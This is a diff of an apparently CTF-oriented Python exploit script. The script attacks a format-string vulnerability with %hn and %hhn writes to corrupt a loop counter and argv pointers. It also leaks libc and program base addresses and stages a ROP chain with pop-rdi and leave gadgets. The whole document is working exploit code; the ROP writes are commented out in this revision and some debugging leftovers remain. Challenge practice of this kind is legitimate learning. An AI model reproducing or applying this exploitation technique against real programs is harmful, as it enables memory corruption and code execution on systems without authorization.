@@ -36,9 +36,18 @@ def fmt_hhn(pre,val,idx):
     padding_char_len = (val - pre) if val >  pre else (val - pre + 256) 
     result = '%' + str(padding_char_len) + 'c%' + str(idx) + '$hhn' 
     return result
-def reset_i(pre):
+def change_lower_argv(off):
+    #change &argv[0] lower 32 bit
+    pay = fmt(0,off,11)
+    #pay = '%' + str(off) + 'c%11$hn'
+    if off == 0:
+        pay = '%11$hn'
+    r.sendline(pay)
     r.recvuntil(':')
-#    r.interactive()
+def set_i():
+    #set i to 10000 
+    r.recvuntil(':')
+    r.interactive()
     r.send('argv:%11$p,%37$p')
     r.recvuntil('argv:')
     
@@ -47,83 +56,65 @@ def reset_i(pre):
     argv0 = int( argv0.ljust(8,'\0') ,0)
     print '%s' % hex(argv)
     print '%s' % hex(argv0)
-
-    #prepare to change i at $6x
+    r.recvuntil(':')
+    #make $37 point to &i at $6
     i_addr = (argv % 0x10000) - 0xec
-    pay = fmt(pre,i_addr,11)
-    pre = i_addr
-    #pay = '%' + str(i_addr) + 'x%11$hn'
-    print 'send ',pay,hex(i_addr)
-    r.sendline(pay)
-
-    #change i to 1000
+    pay = fmt(0,i_addr,11)
+    r.send(pay.ljust(16,'\0'))
     r.recvuntil(':')
     sleep(0.1)
-    #pay = fmt(pre,1000,37)
-    #pre = 1000
-    pay = '%' + '1000' + 'x%37$hn'
-    r.sendline(pay)
-
+    #change i to 1000
+    pay = fmt(0,10000,37)
+    r.send(pay.ljust(16,'\0'))
     r.recvuntil(':')
-    #reset argv[0]
-    #clean_pipe()
-    #argv0_off = (argv0 % 0x10000)
-    change_argv(0)
+    
+    return argv,argv0
+def set_higher_pointer(argv):
+    #make $12/$13/$14 point to higher 2/4/6 byte of &argv[0].
+    #make it easier to access memory with given address.
+    print hex(argv - 0xc8)
+    for j in range(3):
+        for i in range(4):
+            off = (argv-0xc8+(j*8)+(i*2)) & 0xffff
+            change_lower_argv(off)
+            val = ( (argv + 0x2*(j+1) ) >> (i*16) ) & 0xffff
+            print hex(off),hex(val)
+            pay = fmt(0,val,37)
+            r.send(pay)
+            r.recvuntil(':')
+    #
     clean_pipe()
-    #check
-    print 'now argv[0] -> ',hex(get_argv())
-    return argv0,pre
-def get_argv():
-     
-    r.sendline('buf:%37$p:')
-    r.recvuntil('buf:')
-    argv = int(r.recvuntil(':')[:-1],0)
-    r.recvuntil(':')
-    return argv
+
+
+def change_argv(addr):
+    #each time wite hn, 4 bytes, to argv[0] 
+    for i in range(4):
+        idx = 11+i
+        val = (addr >> (i*16) ) & 0xffff 
+        pay = fmt(0,val,idx)
+        r.sendline(pay)
+        r.recvuntil(':')
 
 def leak_libc_base():
-    clean_pipe()
     r.send('%9$p')
     r.recvuntil('0x')
     ret_libc = int( r.recv(12).ljust(8,'\0') ,16)
     libc = ret_libc - libc_off
     return libc 
 def leak_text_base():
-    clean_pipe()
     r.send('%8$p')
     r.recvuntil('0x')
     text_off = 0xa80 
     rbp_libc = int( r.recv(12).ljust(8,'\0') ,16)
     text_base = rbp_libc - text_off
     return text_base 
-def write_rop(rop):
-    now_off = get_argv() & 0xffff
-    off = now_off
-    print 'rop ' , hex(rop)
-    clean_pipe()
-    for i in range(8):
-        val = ( rop >> (i*8) ) & 0xff
-        pay = fmt_hhn(0,val,37)
-        change_argv(off+i)
-        r.send(pay)
-        r.recvuntil(':')
-    change_argv(off+8)
-def change_argv(off):
-    #change argv[0]
-    pay = '%' + str(off) + 'c%11$hn'
-    if off == 0:
-        pay = '%11$hn'
-    r.sendline(pay)
-    r.recvuntil(':')
-def set():
-    change_argv
+
 def clean_pipe():
     sleep(0.1)
     r.recv(timeout = 0.01)
-pre = 0
-argv0,pre = reset_i(0)
-
-
+argv,argv0 = set_i()
+set_higher_pointer(argv)
+r.interactive()
 libc = leak_libc_base()
 text = leak_text_base()
 
@@ -137,16 +128,16 @@ leave_off = 0x9af
 pop_rdi_addr = libc + pop_rdi_off
 leave_addr = text + leave_off
 
-clean_pipe()
-r.interactive()
+#clean_pipe()
+#r.interactive()
+'''
 write_rop(pop_rdi_addr)
 write_rop(0x123456)
 
 write_rop(leave_addr)
 
+'''
 
-
-clean_pipe()
 r.interactive()
 
 
